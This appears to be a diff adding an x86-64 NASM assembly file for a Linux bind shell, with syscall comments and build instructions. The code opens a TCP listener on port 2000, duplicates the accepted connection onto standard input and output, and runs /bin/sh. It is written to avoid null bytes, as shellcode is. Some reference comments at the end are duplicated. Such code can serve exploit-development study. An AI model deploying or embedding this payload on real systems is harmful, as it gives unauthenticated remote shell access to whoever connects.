@@ -1,0 +1,181 @@
+;system call number can be checked at
+;cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h
+
+;sock 41
+;int socket(int domain, int type, int protocol);
+;domain = protocol family = AF_INET = 2
+;type = SOCK_STREAM = tcp = 1
+;protocol = ip = 0 or 6
+;cat /usr/include/x86_64-linux-gnu/bits/socket.h
+						;arguments in 64 are passed in order of
+                                                ;rdi, rsi, rdx(second return register), rcx(integer) r8, r9
+BITS 64
+;socket(2,1,6)
+	xor rax, rax
+	xor rdi, rdi
+	xor rsi, rsi
+	xor rdx, rdx
+	push 41					;socket = 41
+	pop rax
+	push 2
+	pop rdi
+	push 1
+	pop rsi
+	push 6
+	pop rdx
+	syscall
+	mov rdi, rax				;move fd to rdi for use in bind
+
+;bind
+;bind(int fd, struct sockaddr *local_addr, socklen_t addr_length)
+;sockaddr(2,2000,0)
+;bind(fd, [2,2000,0], 16)
+;//2 bytes for family
+;//2 bytes for port
+;//4 bytes for IP address
+
+	xor rax, rax
+	xor rsi,rsi
+	xor rdx, rdx
+	push 49					;bind = 49
+	pop rax
+	push rsi
+	mov byte [rsp],0x2
+	mov word [rsp + 2], 0xd007		;port 2000 little indian
+	mov rsi, rsp				;have rsi point to this 00000000d0070002
+	push 16
+	pop rdx
+	syscall
+
+;listen
+;listen(int fd, int backlog_queue_size)
+;listen(fd, 128)
+	xor rax, rax
+	xor rsi, rsi
+	push 50					;listen = 50
+	pop rax
+	mov sil,  128				;2nd arg = 128, using si lower move to avoid null bytes
+	;pop rsi
+	syscall 
+
+;accept
+;accept(int fd, sockaddr *remote_host, socklen_t *addr_length) returns new accept socket
+;cfd = accept(sockfd, *addr struct, *16)
+
+	xor rax, rax
+	xor rsi, rsi
+	mov rsi, rsp				;get pointer to sock addr
+	xor rdx, rdx
+	xor rcx, rcx
+	mov cl, 16 
+	push rcx
+	mov rdx, rsp				;3rd arg points to 16
+	push 43
+	pop rax
+	syscall					;rax ow have new accept fd
+	mov rdi, rax				;move accept fd to first argument
+ ; Dup2
+    ; Function prototype:
+    ;   int dup2(int oldfd, int newfd)
+    ;making fd the new stdin/out/err
+
+	xor rsi,rsi
+    	push 3
+    	pop rsi                                                     ;second arg = 3
+                                                                ;first argument rdi still = fd
+                                                                ;so dup2(rdi, rsi)
+                                                                ;dup2(fd, stdin/out/err)
+    xor rcx, rcx
+    mov cl, 3                                                 ;set loop counter rcx to 3, will do 3 loops
+loop:
+    dec rsi                                                     ;decrease rsi to 2,1,0
+    push 33                                                   ;dup2 syscall = 33
+    pop rax
+    syscall
+jne loop
+
+
+;int execve(const char *filename, char *const argv[],char *const envp[]);
+;execve(*/bin/sh, *null, *null)
+;//bin/sh: 8 bytes long = 2f2f62696e2f7368: little indian = 0068732f6e69622f2f
+;needed "//" to avoid null when move string into rdi
+
+	xor rdi,rdi					;clear 1st arg
+	xor rsi, rsi					;clear second
+	xor rdx, rdx					;clear third
+    	push rdi
+	mov rsi, rsp					;2nd arg rsi point to null
+	mov rdx, rsp					;3 arg point to null
+	mov rdi, 0x68732f6e69622f2f			;move hs/nib// into 1st arg
+	shr rdi, 8					;shift right 8 BITS
+    	push rdi
+	mov rdi, rsp					;have it point to the string
+    	push 59						;execve syscall number
+    	pop    rax
+    	syscall 
+
+
+;assemble with nasm bindShellShell64.asm
+
+;if want an executable
+;nasm -f elf64 bindShellShell64.asm
+;ld -m elf_x86_64 bindShellShell64.o -o bindShellShell64.x
+
+;Socket(int domain, int type, int protocol)
+;Used to create a new socket, returns a file descriptor for the socket or
+;-1 on error.
+
+;connect(int fd, struct sockaddr *remote_host, socklen_t addr_length)
+;Connects a socket (described by file descriptor fd) to a remote host.
+;Returns 0 on success and -1 on error.
+
+;bind(int fd, struct sockaddr *local_addr, socklen_t addr_length)
+;Binds a socket to a local address so it can listen for incoming connections.
+;Returns 0 on success and -1 on error.
+
+;listen(int fd, int backlog_queue_size)
+;Listens for incoming connections and queues connection requests up to
+;backlog_queue_size. Returns 0 on success and -1 on error.
+
+;accept(int fd, sockaddr *remote_host, socklen_t *addr_length)
+;Accepts an incoming connection on a bound socket. The address infor-
+;mation from the remote host is written into the remote_host structure and
+;the actual size of the address structure is written into *addr_length. This
+;Connects a socket (described by file descriptor fd) to a remote host.
+;Returns 0 on success and -1 on error.
+
+;bind(int fd, struct sockaddr *local_addr, socklen_t addr_length)
+;Binds a socket to a local address so it can listen for incoming connections.
+;Returns 0 on success and -1 on error.
+
+;listen(int fd, int backlog_queue_size)
+;Listens for incoming connections and queues connection requests up to
+;backlog_queue_size. Returns 0 on success and -1 on error.
+
+;accept(int fd, sockaddr *remote_host, socklen_t *addr_length)
+;Accepts an incoming connection on a bound socket. The address infor-
+;mation from the remote host is written into the remote_host structure and
+;the actual size of the address structure is written into *addr_length. This
+;function returns a new socket file descriptor to identify the connected
+;socket or -1 on error.
+
+;send(int fd, void *buffer, size_t n, int flags)
+;Sends n bytes from *buffer to socket fd; returns the number of bytes sent
+;or -1 on error.
+
+;recv(int fd, void *buffer, size_t n, int flags)
+;Receives n bytes from socket fd into *buffer; returns the number of bytes
+;received or -1 on error.
+
+;//AF_INET address sockaddr_in struct  can be view at
+;// cat /usr/include/netinet/in.h | grep -A5 sockaddr_in
+;//socket function variable
+;//can be refernced at  cat /usr/include/x86_64-linux-gnu/bits/socket.h
+
+;//IPv4 uses sockaddr_in socket address struct 16 byte long including
+;//2 bytes for family
+;//2 bytes for port
+;//4 bytes for IP address
+;//8 byte padding 
+;//__|__|____|________
+
